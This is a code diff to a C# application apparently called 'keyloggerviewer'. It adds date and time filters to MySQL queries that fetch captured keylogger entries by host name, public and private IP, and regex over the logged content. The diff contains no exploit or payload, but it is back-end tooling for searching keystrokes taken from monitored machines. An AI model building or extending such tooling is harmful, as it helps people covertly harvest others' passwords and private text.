@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Data;
 using System.Windows.Forms;
+using Microsoft.VisualBasic;
 using MySql.Data.MySqlClient;
 
 
@@ -18,7 +19,8 @@ namespace keyloggerviewer
         }
         
         public List<LogData> simpleGet(string hostName="", string hostPublicIp="", string hostPrivateIp="",
-            string type="", int contentMaxLen=1000, int contentMinLen=0, string regex="", int lineBefore=0, int lineAfter=0)
+            string type="", int contentMaxLen=1000, int contentMinLen=0, string regex="", int lineBefore=0, 
+            int lineAfter=0, string startDate="", string endDate="", string startTime="", string endTime="")
         {
             List<LogData> logList = new List<LogData>();
             if (connection.State != ConnectionState.Open)
@@ -33,7 +35,11 @@ namespace keyloggerviewer
             AND (@type = '' OR l.logType = @type)
             AND (@contentmaxlen = 0 OR l.content IS NULL OR CHAR_LENGTH(l.content) < @contentmaxlen)
             AND (@contentminlen = 0 OR l.content IS NULL OR CHAR_LENGTH (l.content) > @contentminlen)
-            AND (@regex = '' OR l.content IS NULL OR l.content REGEXP @regex)";
+            AND (@regex = '' OR l.content IS NULL OR l.content REGEXP @regex)
+            AND (@startTime = '' OR l.logTime >= @startTime)
+            AND (@endTime = '' OR l.logTime <= @endTime)
+            AND (@startDate = '' OR l.logDate >= @startDate)
+            AND (@endDate = '' OR l.logDate <= @endDate)";
             MySqlCommand req = new MySqlCommand(sqlReq, connection);
             req.Parameters.AddWithValue("@hostname", hostName);
             req.Parameters.AddWithValue("@publicip", hostPublicIp);
@@ -41,6 +47,10 @@ namespace keyloggerviewer
             req.Parameters.AddWithValue("@type", type);
             req.Parameters.AddWithValue("@contentmaxlen", contentMaxLen);
             req.Parameters.AddWithValue("@contentminlen", contentMinLen);
+            req.Parameters.AddWithValue("@startTime", startTime);
+            req.Parameters.AddWithValue("@endTime", endTime);
+            req.Parameters.AddWithValue("@startDate", startDate);
+            req.Parameters.AddWithValue("@endDate", endDate);
             req.Parameters.AddWithValue("@regex", regex);
             MySqlDataReader rdr = req.ExecuteReader();
             List<int[]> idCombo = new List<int[]>();
@@ -55,7 +65,7 @@ namespace keyloggerviewer
             {
                 Console.WriteLine(i[0]);
                 Console.WriteLine(i[1]);
-                sqlReq = @"SELECT h.hostName, h.hostPublicIp, h.hostPrivateIp, l.logDate, l.logType, l.content, l.logId
+                sqlReq = @"SELECT h.hostName, h.hostPublicIp, h.hostPrivateIp, TIMESTAMP(l.logDate, l.logTime), l.logType, l.content, l.logId
                             FROM host as h JOIN log as l ON h.hostId = l.hostId
                             WHERE (l.logId <= @maxLog) AND (l.logId >= @minLog) AND (l.hostId=@hostId)";
                 req = new MySqlCommand(sqlReq, connection);
